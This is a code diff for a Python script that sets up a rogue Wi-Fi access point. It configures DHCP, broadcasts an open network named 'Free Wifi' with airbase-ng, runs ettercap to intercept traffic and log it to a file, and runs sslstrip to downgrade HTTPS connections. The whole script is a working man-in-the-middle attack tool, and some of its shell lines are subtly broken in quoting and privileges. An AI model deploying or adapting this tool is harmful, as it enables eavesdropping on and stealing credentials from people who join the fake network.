@@ -8,12 +8,25 @@ from monitor_management import *
 
 def configure_dhcp():
 	os.system("echo dhcp")
+	os.system("sudo rm /etc/dhcp/dhcpd.conf")
+	os.system("sudo touch /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'ddns-update-style none;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'option domain-name \"home\";' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'subnet 192.168.255.0 netmask 255.255.255.0' { >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'option broadcast-address 192.168.255.255;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'option routers 192.168.255.1;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo 'range 192.168.255.85 192.168.255.90;' >> /etc/dhcp/dhcpd.conf")
+	os.system("sudo echo '}' >> /etc/dhcp/dhcpd.conf")
 
 def make_mon():
 	os.system("echo mon")
 	start_monitor("wlan0")
 	command= ["sudo","airbase-ng", "-e"]
-	command.append("deduroam")
+	command.append("Free Wifi")
 	command.append("-c")
 	command.append("9")
 	command.append("mon0")
@@ -40,16 +53,17 @@ def setroute():
 def runettercap():
 	os.system("echo ettercap")
 	command=['sudo', "ettercap", "-T", "-q", "-i" "at0"]
-	sub= subprocess.Popen(command)
+	file= open("/home/isis/etterout","w")
+	sub= subprocess.Popen(command,stdout=file)
 	time.sleep(5)
 
 def runsslstrip():
 	os.system("echo sslstrip")
 	command=['sudo', "sslstrip", "-a", "-k", "-f"]
-	sub= subprocess.Popen(command)
+	sub= subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 	time.sleep(5)
-	
-if __name__ == '__main__':
+
+def start_rogue_ap():
 	configure_dhcp()
 	make_mon()
 	configure_firewall()
@@ -58,3 +72,5 @@ if __name__ == '__main__':
 	runsslstrip()
 	configure_firewall()
 
+if __name__ == '__main__':
+	start_rogue_ap()
